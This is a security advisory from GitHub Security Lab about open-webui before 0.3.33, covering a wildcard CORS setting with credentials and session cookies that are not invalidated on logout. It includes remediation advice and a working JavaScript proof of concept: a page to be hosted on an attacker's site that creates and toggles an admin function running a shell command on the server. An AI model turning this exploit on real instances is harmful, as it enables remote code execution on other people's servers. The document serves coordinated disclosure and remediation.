# [H] Open WebUI has a CORS misconfiguration and session validation issue

## Summary
Severity: High
Advisory: GHSA-6xcp-7mpr-m7wm
CWE: CWE-613
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-11
Source: https://github.com/advisories/GHSA-6xcp-7mpr-m7wm
Type: github-advisory

## Affected
- PyPI: `open-webui` — affected >=0 <0.3.33

## Details
# GitHub Security Lab (GHSL) Vulnerability Report, open-webui: `GHSL-2024-174`, `GHSL-2024-175`

The [GitHub Security Lab](https://securitylab.github.com) team has identified potential security vulnerabilities in [open-webui](https://github.com/open-webui/open-webui).

We are committed to working with you to help resolve these issues. In this report you will find everything you need to effectively coordinate a resolution of these issues with the GHSL team.

If at any point you have concerns or questions about this process, please do not hesitate to reach out to us at `securitylab@github.com` (please include `GHSL-2024-174` or `GHSL-2024-175` as a reference). See also [this blog post](https://github.blog/2022-04-22-removing-the-stigma-of-a-cve/) written by GitHub's Advisory Curation team which explains what CVEs and advisories are, why they are important to track vulnerabilities and keep downstream users informed, the CVE assigning process, and how they are used to keep open source software secure.

If you are _NOT_ the correct point of contact for this report, please let us know!

## Summary

Due to a CORS misconfiguration and session validation issue, an attacker may be able to perform a 1 click attack against browsers with admin access to openwebui, resulting in remote code execution in the openwebui instance. The openwebui application runs as root in Docker container's default setup, which allows for complete compromise of the container.

## Project

open-webui

## Tested Version

[v0.3.10](https://github.com/open-webui/open-webui/releases/tag/v0.3.10)

## Details

### Issue 1: CORS misconfiguration on multiple routers (`GHSL-2024-174`)

CORS misconfigurations exist on multiple routers of open-webui which results in allowing arbitrary websites to make authenticated cross site requests to openwebui. Accounts with access to the `/api/v1/functions` endpoint (admins) can execute arbitrary code on the openwebui instance. 

The following pattern occurs at the following routers:
1. [backend/apps/webui/main.py](https://github.com/open-webui/open-webui/blob/v0.3.10/backend/apps/webui/main.py#L92)
2. [backend/apps/audio/main.py](https://github.com/open-webui/open-webui/blob/v0.3.10/backend/apps/audio/main.py#L58)
3. [backend/apps/images/main.py](https://github.com/open-webui/open-webui/blob/v0.3.10/backend/apps/images/main.py#L60)
4. [backend/apps/rag/main.py](https://github.com/open-webui/open-webui/blob/v0.3.10/backend/apps/rag/main.py#L246)
5. [backend/apps/openai/main.py](https://github.com/open-webui/open-webui/blob/v0.3.10/backend/apps/openai/main.py#L47)
6. [backend/apps/ollama/main.py](https://github.com/open-webui/open-webui/blob/v0.3.10/backend/apps/ollama/main.py#L62)
7. [backend/main.py](https://github.com/open-webui/open-webui/blob/v0.3.10/backend/main.py#L881)
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

#### Impact

This issue may lead to `Remote Code Execution`.

#### Remediation

The FastAPI CORS middleware is not safe by default, meaning it reflects the origin when specifying `allow_origins=["*"]`.  Remove the vulnerable, broad origin and allow users to dynamically setup the exact allowed origins via the administration panel or config file, do not allow for broad origins such as `"*"` or `"*.com"`

#### Proof of Concept

Host the following code on your website, `attacker.com`. Open the webpage using Firefox, and click on the webpage as instructed. Check your openwebui host to see the result of the command `whoami` placed into a newly created file `/tmp/whoami.txt`. Ensure you have logged into an admin open-webui account 
```javascript
<body>
    <p>Click here to login.</p>
    <div id="response"></div>
 
    <script>
      //Firefox cross site cookie request bypass
      const url = 'http://localhost:3000/static/favicon.png';
      document.addEventListener("DOMContentLoaded", () => {
        document.onclick = () => {
          open(url);
          filter_id = "okok"
//Create a function/filter to write code
fetch('http://localhost:3000/api/v1/functions/create', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    "id": filter_id,
    "name": "test2",
    "meta": {"description": "test2"},
    "content": "from pydantic import BaseModel, Field\nfrom typing import Optional\n\n\nclass Filter:\n    class Valves(BaseModel):\n        priority: int = Field(\n            default=0, description=\"Priority level for the filter operations.\"\n        )\n        max_turns: int = Field(\n            default=8, description=\"Maximum allowable conversation turns for a user.\"\n        )\n        pass\n\n    class UserValves(BaseModel):\n        max_turns: int = Field(\n            default=4, description=\"Maximum allowable conversation turns for a user.\"\n        )\n        pass\n\n    def __init__(self):\n        # Indicates custom file handling logic. This flag helps disengage default routines in favor of custom\n        # implementations, informing the WebUI to defer file-related operations to designated methods within this class.\n        # Alternatively, you can remove the files directly from the body in from the inlet hook\n        # self.file_handler = True\n\n        # Initialize 'valves' with specific configurations. Using 'Valves' instance helps encapsulate settings,\n        # which ensures settings are managed cohesively and not confused with operational flags like 'file_handler'.\n        self.valves = self.Valves()\n        f = open(\"/tmp/whoami.txt\", \"w\")\n        import subprocess\n\n        output = subprocess.getoutput(\"whoami\")\n        f.write(output)\n        f.close()\n        pass\n\n    def inlet(self, body: dict, __user__: Optional[dict] = None) -> dict:\n        return body\n\n    def outlet(self, body: dict, __user__: Optional[dict] = None) -> dict:\n        return body\n"
  }),
  credentials: 'include' // This will send cookies from the origin
})
.then(response => response.json())
.then(data => console.log(data))
.catch((error) => console.error('Error:', error)); 


//Toggle the filter to execute code
fetch(`http://localhost:3000/api/v1/functions/id/${filter_id}/toggle`, {
  method: 'POST',
  credentials: 'include' // This will send cookies from the origin
})
.then(response => response.json())
.then(data => console.log(data))
.catch((error) => console.error('Error:', error)); 
        }
      });
    </script>
  </body>
```

### Issue 2: Failure to Invalidate Session on Logout (`GHSL-2024-175`)

Openwebui fails to invalidate and clear session cookies after logout. In fact, it seems to reuse the same session cookies. This allows an attacker who has access to previous session cookie details to login at a later point as long as the victim has not closed their browser.

This vulnerability is relevant to the above CORS issue because it no longer requires the user to be logged in to exploit. If the cookie had been properly invalidated/cleared, the CORS issue would only affect logged in users. 

#### Impact

This issue may increase the impact of primitives gained from other security issues.

#### Remediation

For every session, new cookies should be generated. When a user logouts, the session cookies from the previous session should be invalidated and removed from the browser's storage.

#### Resources
[OWASP Recommendation On Sessions](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)

## GitHub Security Advisories

We recommend you create a private [GitHub Security Advisory](https://help.github.com/en/github/managing-security-vulnerabilities/creating-a-security-advisory) for these findings. This also allows you to invite the GHSL team to collaborate and further discuss these findings in private before they are [published](https://help.github.com/en/github/managing-security-vulnerabilities/publishing-a-security-advisory).

## Credit

These issues were discovered and reported by GHSL team member [@Kwstubbs (Kevin Stubbings)](https://github.com/Kwstubbs).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2024-174` or `GHSL-2024-175` in any communication regarding these issues.

## Disclosure Policy

This report is subject to a 90-day disclosure deadline, as described in more detail in our [coordinated disclosure policy](https://securitylab.github.com/advisories#policy).

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-6xcp-7mpr-m7wm
- https://github.com/open-webui/open-webui
